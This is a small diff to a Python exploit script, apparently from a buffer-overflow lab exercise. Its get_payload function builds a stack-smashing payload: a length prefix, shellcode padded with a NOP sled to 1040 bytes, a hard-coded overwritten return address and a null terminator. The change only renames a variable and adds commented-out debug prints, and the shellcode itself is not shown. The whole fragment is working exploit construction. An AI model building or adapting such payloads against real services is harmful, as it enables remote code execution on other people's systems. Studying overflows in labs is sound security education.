@@ -61,10 +61,14 @@ def get_payload() -> bytes:
     Returns:
          The bytes of the payload.
     """
-    shellcode_decoded = get_shellcode()
+    shellcode = get_shellcode()
     size = network_order_uint32(1040 + 4 + 1)
     patched_ret_addr = struct.pack('<I', 0xbfffde62)
-    payload = size + shellcode_decoded.rjust(1040, NOP) + patched_ret_addr + "\x00".encode('latin1')
+    payload = size + shellcode.rjust(1040, NOP) + patched_ret_addr + "\x00".encode('latin1')
+    #print(f"payload: {payload}")
+    #print("payload length: ", len(payload)) 
+    #print("shellcode length: ", len(shellcode)) 
+    
     return payload
 
 def network_order_uint32(value) -> bytes:
